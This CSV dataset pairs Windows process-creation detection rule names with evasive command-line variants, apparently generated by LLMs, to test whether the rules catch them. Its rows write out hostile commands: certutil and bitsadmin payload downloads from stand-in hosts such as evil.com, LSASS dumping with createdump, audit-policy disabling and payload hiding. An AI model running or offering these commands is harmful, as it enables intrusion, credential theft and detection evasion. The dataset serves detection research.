rule_name,commandline_evasion,row_count,sources
proc_creation_win_wmic_recon_hotfix,"powershell.exe -cOMmaNd ""Get-HotFix""",2,gemini; qwen32b
proc_creation_win_wmic_recon_hotfix,"powershell.exe -cOmmaND ""Get-HotFix""",2,gemini; qwen32b
proc_creation_win_wmic_recon_hotfix,"powershell.exe -comMAnD ""Get-HotFix""",2,gemini; qwen32b
proc_creation_win_wmic_recon_hotfix,"wmic path win32_quickfixengineering get Caption, HotFixID, InstalledOn",2,gemini; qwen32b
proc_creation_win_wmic_recon_hotfix,wmic.exe /namespace:\root\cimv2 path win32_quickfixengineering get HotFixID /format:csv,3,qwen14b:3
proc_creation_win_wmic_recon_system_info_uncommon,wmic os get Caption /value && wmic os get OSArchitecture /value && wmic os get Version /value,2,gemini; qwen32b
proc_creation_win_wmic_recon_volume,"wmic.exe fsdir where ""drive='C:'"" get name,filesize",2,gemini:2
proc_creation_win_wmic_recon_volume,wmic.exe logicaldisk list brief,3,gemini:2; qwen32b
proc_creation_win_wmic_recon_volume,"wmic.exe logicaldisk where ""DriveType=3"" get Name,Size,FreeSpace",3,gemini:2; qwen32b
proc_creation_win_wmic_recon_volume,"wmic.exe partition get name,size",2,gemini:2
proc_creation_win_wmic_remote_execution,"powershell.exe -""Command"" ""Get-CimInstance -ClassName Win32_Process -CimSession 192.168.1.100""",2,gemini; qwen32b
proc_creation_win_wmic_remote_execution,"powershell.exe -CoMmAnd ""Get-WmiObject -Class Win32_Process -ComputerName 192.168.1.100""",2,gemini; qwen32b
proc_creation_win_wmic_remote_execution,"powershell.exe -ComManD ""Get-WmiObject -Class Win32_Process -ComputerName 192.168.1.100""",1,gemini
proc_creation_win_wmic_remote_execution,"powershell.exe -CommANd ""Get-WmiObject -Class Win32_Process -ComputerName 192.168.1.100""",2,gemini; qwen32b
proc_creation_win_wmic_remote_execution,"powershell.exe -Command ""Get-CimInstance -ClassName Win32_Process -CimSession 192.168.1.100""",2,gemini; qwen32b
proc_creation_win_wmic_remote_execution,"powershell.exe -Command ""Get-WmiObject -Class Win32_Process -ComputerName 192.168.1.100""",1,gemini
proc_creation_win_wmic_remote_execution,"powershell.exe -c ""Get-CimInstance -ClassName Win32_Process -CimSession 192.168.1.100""",2,gemini; qwen32b
proc_creation_win_wmic_remote_execution,"powershell.exe -c ""Get-WmiObject -Class Win32_Process -ComputerName 192.168.1.100""",2,gemini; qwen32b
proc_creation_win_wmic_remote_execution,"powershell.exe -cOmMand ""Get-CimInstance -ClassName Win32_Process -CimSession 192.168.1.100""",1,gemini
proc_creation_win_wmic_remote_execution,"powershell.exe -cOmmanD ""Get-WmiObject -Class Win32_Process -ComputerName 192.168.1.100""",1,gemini
proc_creation_win_wmic_remote_execution,"powershell.exe -coMMaNd ""Get-CimInstance -ClassName Win32_Process -CimSession 192.168.1.100""",1,gemini
proc_creation_win_wmic_remote_execution,"powershell.exe -coMMand ""Get-CimInstance -ClassName Win32_Process -CimSession 192.168.1.100""",2,gemini; qwen32b
proc_creation_win_wmic_remote_execution,"powershell.exe -commaND ""Get-WmiObject -Class Win32_Process -ComputerName 192.168.1.100""",2,gemini; qwen32b
proc_creation_win_wmic_remote_execution,"powershell.exe /""Command"" ""Get-CimInstance -ClassName Win32_Process -CimSession 192.168.1.100""",1,gemini
proc_creation_win_wmic_remote_execution,"powershell.exe /""Command"" ""Get-WmiObject -Class Win32_Process -ComputerName 192.168.1.100""",2,gemini; qwen32b
proc_creation_win_wmic_service_manipulation,"powershell.exe -""Command"" ""Start-Service -Name 'wuauserv'""",2,gemini; qwen32b
proc_creation_win_wmic_service_manipulation,"powershell.exe -CommAnD ""Start-Service -Name 'wuauserv'""",1,gemini
proc_creation_win_wmic_service_manipulation,"powershell.exe -Command ""Start-Service -Name 'wuauserv'""",1,gemini
proc_creation_win_wmic_service_manipulation,"powershell.exe -c ""Start-Service -Name 'wuauserv'""",2,gemini; qwen32b
proc_creation_win_wmic_service_manipulation,"powershell.exe -cOmMANd ""Start-Service -Name 'wuauserv'""",1,gemini
proc_creation_win_wmic_service_manipulation,"powershell.exe -coMMaND ""Start-Service -Name 'wuauserv'""",1,gemini
proc_creation_win_wmic_service_manipulation,"powershell.exe -coMmand ""Start-Service -Name 'wuauserv'""",2,gemini; qwen32b
proc_creation_win_wmic_service_manipulation,"powershell.exe /""Command"" ""Start-Service -Name 'wuauserv'""",2,gemini; qwen32b
proc_creation_win_wmic_stdregprov_reg_modification,"powershell -""nop"" -""c"" ""([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')""",2,gemini; qwen32b
proc_creation_win_wmic_stdregprov_reg_modification,"powershell -""nop"" -""c"" ""([wmiclass]'ROOT\default:StdRegProv').CreateKey(2147483650,'Software\Policies\DeleteMe')""",4,gemini:3; qwen32b
proc_creation_win_wmic_stdregprov_reg_modification,"powershell -""nop"" -c ""([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')""",2,gemini; qwen32b
proc_creation_win_wmic_stdregprov_reg_modification,"powershell -""nop"" -c ""([wmiclass]'ROOT\default:StdRegProv').CreateKey(2147483650,'Software\Policies\DeleteMe')""",4,gemini:3; qwen32b
proc_creation_win_wmic_stdregprov_reg_modification,"powershell -""nop"" /""c"" ""([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')""",2,gemini; qwen32b
proc_creation_win_wmic_stdregprov_reg_modification,"powershell -""nop"" /""c"" ""([wmiclass]'ROOT\default:StdRegProv').CreateKey(2147483650,'Software\Policies\DeleteMe')""",3,gemini:3
proc_creation_win_wmic_stdregprov_reg_modification,"powershell -NoProfile -Command ""([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')""",10,gemini:9; qwen32b
proc_creation_win_wmic_stdregprov_reg_modification,"powershell -NoProfile /""c"" ""([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')""",2,gemini; qwen32b
proc_creation_win_wmic_stdregprov_reg_modification,"powershell -NoProfile /""c"" ""([wmiclass]'ROOT\default:StdRegProv').CreateKey(2147483650,'Software\Policies\DeleteMe')""",3,gemini:3
proc_creation_win_wmic_stdregprov_reg_modification,"powershell -Nop -""c"" ""([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')""",2,gemini; qwen32b
proc_creation_win_wmic_stdregprov_reg_modification,"powershell -Nop -""c"" ""([wmiclass]'ROOT\default:StdRegProv').CreateKey(2147483650,'Software\Policies\DeleteMe')""",3,gemini:3
proc_creation_win_wmic_stdregprov_reg_modification,"powershell -Nop -Command ""([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')""",10,gemini:9; qwen32b
proc_creation_win_wmic_stdregprov_reg_modification,"powershell -nop -c ""([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')""",10,gemini:9; qwen32b
proc_creation_win_wmic_stdregprov_reg_modification,"powershell /""nop"" -""c"" ""([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')""",2,gemini; qwen32b
proc_creation_win_wmic_stdregprov_reg_modification,"powershell /""nop"" -""c"" ""([wmiclass]'ROOT\default:StdRegProv').CreateKey(2147483650,'Software\Policies\DeleteMe')""",4,gemini:3; qwen32b
proc_creation_win_wmic_stdregprov_reg_modification,"powershell.exe -""Command"" ""Invoke-WmiMethod -Namespace 'root\default' -Class StdRegProv -Name CreateKey -ArgumentList @(2147483650, 'SOFTWARE\Policies\DeleteMe')""",5,gemini:4; qwen32b
proc_creation_win_wmic_stdregprov_reg_modification,"powershell.exe -COmMAnd ""Invoke-WmiMethod -Namespace 'root\default' -Class StdRegProv -Name CreateKey -ArgumentList @(2147483650, 'SOFTWARE\Policies\DeleteMe')""",10,gemini:9; qwen32b
proc_creation_win_wmic_stdregprov_reg_modification,"powershell.exe -COmmaND ""Invoke-WmiMethod -Namespace 'root\default' -Class StdRegProv -Name CreateKey -ArgumentList @(2147483650, 'SOFTWARE\Policies\DeleteMe')""",10,gemini:9; qwen32b
proc_creation_win_wmic_stdregprov_reg_modification,"powershell.exe -Command ""Invoke-WmiMethod -Namespace 'root\default' -Class StdRegProv -Name CreateKey -ArgumentList @(2147483650, 'SOFTWARE\Policies\DeleteMe')""",10,gemini:9; qwen32b
proc_creation_win_wmic_stdregprov_reg_modification,"powershell.exe -c ""Invoke-WmiMethod -Namespace 'root\default' -Class StdRegProv -Name CreateKey -ArgumentList @(2147483650, 'SOFTWARE\Policies\DeleteMe')""",10,gemini:9; qwen32b
proc_creation_win_wmic_stdregprov_reg_modification,"powershell.exe /""Command"" ""Invoke-WmiMethod -Namespace 'root\default' -Class StdRegProv -Name CreateKey -ArgumentList @(2147483650, 'SOFTWARE\Policies\DeleteMe')""",5,gemini:4; qwen32b
proc_creation_win_wmic_uninstall_application,"powershell.exe ""Get-WmiObject -Class Win32_Product | Where-Object {$_.Name -like '*ApplicationName*'} | ForEach-Object {$_.Uninstall()}""",1,gemini
proc_creation_win_wuauclt_no_cli_flags_execution,"C:\Windows\System32\wuauclt.exe """"",1,gemini
proc_creation_win_xwizard_runwizard_com_object_exec,"xwizard RunWizard ""{53d4bb30 - 3f36 - 4e8a - b078 - 69d36c4a79ff}""",1,gemini
proc_creation_win_addinutil_suspicious_cmdline,"C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddInUtil.exe ""-AddInRoot"":C:\Users\Public\Addins",1,gemini
proc_creation_win_addinutil_suspicious_cmdline,C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddInUtil.exe /AddInRoot:C:\Users\Public\Addins,1,gemini
proc_creation_win_at_interactive_execution,at 13:20 /i cmd,2,qwen14b; qwen32b
proc_creation_win_attrib_system_susp_paths,"attrib.exe ""+s"" C:\Users\Public\payload.exe",1,gemini
proc_creation_win_attrib_system_susp_paths,attrib.exe +s C:\Users\Public\malicious.txt,1,gemini
proc_creation_win_attrib_system_susp_paths,attrib.exe +sh C:\Users\AppData\Local\malicious.txt,1,gemini
proc_creation_win_attrib_system_susp_paths,copy attrib.exe not_attrib.exe && not_attrib.exe +s C:\Users\Downloads\payload.exe,2,gemini; qwen32b
proc_creation_win_attrib_system_susp_paths,"powershell.exe -Command ""(Get-Item 'C:\Users\Public\payload.exe').Attributes = 'System'""",1,gemini
proc_creation_win_auditpol_susp_execution,auditpol.exe /set /category:Detailed_Tracking /success:disable,1,gemini
proc_creation_win_bash_command_execution,"C:\Users\thaim\AppData\Local\Microsoft\WindowsApps\bash.exe -c ""$(whoami)""",1,qwen32b
proc_creation_win_bash_command_execution,"C:\Users\thaim\AppData\Local\Microsoft\WindowsApps\bash.exe -c ""\""whoami\""""",1,qwen32b
proc_creation_win_bash_command_execution,"C:\Users\thaim\AppData\Local\Microsoft\WindowsApps\bash.exe -c ""whoami""",1,qwen32b
proc_creation_win_bash_command_execution,C:\Users\thaim\AppData\Local\Microsoft\WindowsApps\bash.exe -c `whoami`,1,qwen32b
proc_creation_win_bash_command_execution,C:\\Users\\thaim\\AppData\\Local\\Microsoft\\WindowsApps\\bash.exe -c whoami,1,qwen32b
proc_creation_win_bitsadmin_download,"C:\Windows\System32\bitsadmin.exe"" /transfer MyJob /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt",1,gemini
proc_creation_win_bitsadmin_download,bitsadmin.exe	/transfer	myJob	http://evil.com/payload.exe	C:\temp\payload.exe,4,gemini:4
proc_creation_win_bitsadmin_download_direct_ip,"bitsadmin -""transfer"" downloadJob http://010.0.0.1/malicious.exe C:\Windows\Temp\malicious.exe",5,gemini:4; qwen32b
proc_creation_win_bitsadmin_download_direct_ip,"bitsadmin /""transfer"" downloadJob http://010.0.0.1/malicious.exe C:\Windows\Temp\malicious.exe",5,gemini:4; qwen32b
proc_creation_win_browsers_chromium_headless_exec,"copy ""C:\Program Files\Google\Chrome\Application\chrome.exe"" ""C:\temp\svchost_browser.exe"" && ""C:\temp\svchost_browser.exe"" --headless https://example.com",2,gemini:2
proc_creation_win_browsers_chromium_headless_file_download,"cmd.exe /c copy ""C:\Program Files\Google\Chrome\Application\chrome.exe"" C:\Temp\sysupdate.exe && C:\Temp\sysupdate.exe --headless --dump-dom http://example.com/payload.txt",2,gemini:2
proc_creation_win_browsers_chromium_load_extension,"copy ""C:\Program Files\Google\Chrome\Application\chrome.exe"" ""C:\Windows\Temp\browser_host.exe"" && ""C:\Windows\Temp\browser_host.exe"" --load-extension=""C:\Users\user\AppData\Local\Temp\HHe2lr""",1,gemini
proc_creation_win_browsers_chromium_mockbin_abuse,"copy ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" ""C:\Windows\Temp\sys_updater.exe"" && ""C:\Windows\Temp\sys_updater.exe"" --headless=new --disable-gpu https://mockbin.org/bin/31b1332f-8f5c-490e-8ec0-78e77b4e5709",1,gemini
proc_creation_win_browsers_chromium_susp_load_extension,"explorer.exe ""C:\Program Files\Google\Chrome\Application\chrome.exe"" --load-extension=""C:\Users\user\AppData\Local\Temp\HHe2lr""",1,gemini
proc_creation_win_browsers_inline_file_download,"cmd.exe /c copy ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" C:\Temp\sysupdate.exe && C:\Temp\sysupdate.exe http://example.com/payload.exe",1,gemini
proc_creation_win_calc_uncommon_exec,copy calc.exe math.exe && math.exe -suspicious_flag,1,gemini
proc_creation_win_certutil_download,"cmd.exe -""c"" certutil.exe -""url^cache"" -""split"" -f http://192.168.1.100/malware.exe C:\ emp\malware.exe",2,gemini; qwen32b
proc_creation_win_certutil_download,"cmd.exe -""c"" certutil.exe /""url^cache"" -split -F http://192.168.1.100/malware.exe C:\ emp\malware.exe",1,gemini
proc_creation_win_certutil_download,"cmd.exe /""c"" certutil.exe -url^cache -SPLIT -F http://192.168.1.100/malware.exe C:\ emp\malware.exe",1,gemini
proc_creation_win_certutil_download,"cmd.exe /""c"" certutil.exe -url^cache -split -f http://192.168.1.100/malware.exe C:\ emp\malware.exe",1,gemini
proc_creation_win_certutil_download,"cmd.exe /c certutil.exe -""url^cache"" -""split"" /""f"" http://192.168.1.100/malware.exe C:\ emp\malware.exe",1,gemini
proc_creation_win_certutil_download,cmd.exe /c certutil.exe -url^cache -split -f http://192.168.1.100/malware.exe C:\	emp\malware.exe,2,gemini; qwen32b
proc_creation_win_certutil_encode_susp_location,"cd C:\Windows\Temp && certutil.exe -""encode"" payload.exe payload.b64",1,gemini
proc_creation_win_certutil_encode_susp_location,"cd C:\Windows\Temp && certutil.exe /""encode"" payload.exe payload.b64",1,gemini
proc_creation_win_certutil_encode_susp_location,"certutil.exe -""encode"" ""C:\Users\Public\"" payload.exe ""C:\Users\Public\"" payload.b64",1,gemini
proc_creation_win_certutil_encode_susp_location,"certutil.exe /""encode"" ""C:\Users\Public\"" payload.exe ""C:\Users\Public\"" payload.b64",2,gemini; qwen32b
proc_creation_win_certutil_encode_susp_location,"certutil.exe /""encode"" C:\ProgramData\payload.exe C:\ProgramData\payload.b64",2,gemini; qwen32b
proc_creation_win_certutil_ntlm_coercion,"certutil.exe -syncwithWU ""\TEST-HOST\share""",2,qwen14b; qwen32b
proc_creation_win_certutil_ntlm_coercion,"certutil.exe -syncwithWU ""\\TEST-HOST\\share""",1,qwen32b
proc_creation_win_cloudflared_tunnel_cleanup,C:\Tools\cloudflared.exe  tunnel  cleanup  -connector-id=99999999-8888-7777-6666-555555555555,1,qwen32b
proc_creation_win_cloudflared_tunnel_cleanup,C:\Tools\cloudflared.exe tunnel	cleanup	-connector-id 99999999-8888-7777-6666-555555555555,2,gemini; qwen32b
proc_creation_win_cloudflared_tunnel_cleanup,"C:\Tools\cloudflared.exe tunnel ""cleanup"" -connector-id 99999999-8888-7777-6666-555555555555",1,gemini
proc_creation_win_cloudflared_tunnel_cleanup,C:\Tools\cloudflared.exe tunnel cleanup -c 99999999-8888-7777-6666-555555555555,2,qwen14b; qwen32b
proc_creation_win_cmd_assoc_execution,"powershell.exe -Command ""New-Item -Path 'HKLM:\SOFTWARE\Classes\.hta' -Value 'txtfile' -Force""",1,gemini
proc_creation_win_cmd_del_greedy_deletion,"cmd.exe /c del ""C:\Temp*.dll""",1,qwen32b
proc_creation_win_cmd_del_greedy_deletion,cmd.exe /c del C:\Temp*.dll,1,qwen32b
proc_creation_win_cmd_del_greedy_deletion,cmd.exe /c del C:\Temp*.exe,1,qwen32b
proc_creation_win_cmd_del_greedy_deletion,cmd.exe /c erase C:\Temp*.dll,1,qwen32b
proc_creation_win_cmd_net_use_and_exec_combo,"cmd.exe -""c"" "" net use https://192.0.2.1/share & start \\192.0.2.1\DavWWWRoot\payload.exe """,1,gemini
proc_creation_win_cmd_net_use_and_exec_combo,"cmd.exe /""c"" "" net use https://192.0.2.1/share & start \\192.0.2.1\DavWWWRoot\payload.exe """,1,gemini
proc_creation_win_cmd_net_use_and_exec_combo,"powershell.exe -Command ""net use http://192.0.2.1/share; Start-Process \\192.0.2.1\DavWWWRoot\payload.exe """,1,gemini
proc_creation_win_cmd_net_use_and_exec_combo,"powershell.exe -c ""net use http://192.0.2.1/share; Start-Process \\192.0.2.1\DavWWWRoot\payload.exe """,1,gemini
proc_creation_win_cmd_net_use_and_exec_combo,"powershell.exe -coMMand ""net use http://192.0.2.1/share; Start-Process \\192.0.2.1\DavWWWRoot\payload.exe """,1,gemini
proc_creation_win_cmd_path_traversal,"cmd.exe /c ""echo test > ..\..\test.txt""",1,qwen32b
proc_creation_win_cmd_ping_copy_combined_execution,cmd.exe /c ping 127.0.0.1 -n 1 && copy C:\Lab\input\sample.txt C:\Lab\out\copy_result.txt,1,qwen14b
proc_creation_win_cmd_ping_copy_combined_execution,cmd.exe /c ping 127.0.0.1 -n 1 > C:\Lab\out\ping_result.txt && copy C:\Lab\input\sample.txt C:\Lab\out\copy_result.txt,1,qwen14b
proc_creation_win_conhost_legacy_option,"""conhost.exe"" 0xffffffff -ForceV1",1,gemini
proc_creation_win_conhost_legacy_option,conhost.exe 0xFFFFFFFF -forcev1,1,gemini
proc_creation_win_conhost_legacy_option,conhost.exe 0xffffffff -ForceV1,1,gemini
proc_creation_win_control_panel_item,reg add HKCU\CurrentVersion\Control_Panel\CPLs /v TestCPL /t REG_SZ /d malicious.cpl /f,3,qwen32b:3
proc_creation_win_control_panel_item,reg.exe add HKCU\CurrentVersion\Control\Panel\CPLs /v TestCPL /t REG_SZ /d malicious.cpl /f,3,qwen32b:3
proc_creation_win_createdump_lolbin_execution,"""C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.0.17\createdump.exe"" ""-u"" ""-f"" C:\Users\Public\dotnet-lsass.dmp 788",1,gemini
proc_creation_win_createdump_lolbin_execution,"""C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.0.17\createdump.exe"" --full --name C:\Users\Public\dotnet-lsass.dmp  788",1,gemini
proc_creation_win_createdump_lolbin_execution,"""C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\\5.0.17\\createdump.exe"" --full --name C:\\Users\\thaim\\AppData\\Local\\Temp\\dotnet-lsass.dmp 788",2,gemini:2
proc_creation_win_createdump_lolbin_execution,"""C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\\5.0.17\\createdump.exe"" --full -f C:\\Users\\thaim\\AppData\\Local\\Temp\\dotnet-lsass.dmp 788",2,gemini:2
proc_creation_win_createdump_lolbin_execution,"copy ""C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.0.17\createdump.exe"" ""C:\Windows\Temp\srv_task.exe"" && ""C:\Windows\Temp\srv_task.exe"" ""-u"" ""-f"" C:\Users\Public\dotnet-lsass.dump 788",2,gemini:2
proc_creation_win_curl_cookie_hijacking,curl.exe -\t-c\t cookies.txt https://example.com,1,qwen32b
proc_creation_win_curl_cookie_hijacking,"curl.exe -c""cookies.txt"" https://example.com",1,qwen32b
proc_creation_win_curl_cookie_hijacking,curl.exe -ccookies.txt https://example.com,1,qwen32b
proc_creation_win_curl_custom_user_agent,"curl.exe ""-H"" ""User-Agent: EvilAgent"" http://example.com",1,gemini
proc_creation_win_curl_custom_user_agent,"curl.exe --user-agent ""EvilAgent"" http://example.com",1,gemini
proc_creation_win_curl_custom_user_agent,"curl.exe -A ""EvilAgent"" http://example.com",1,gemini
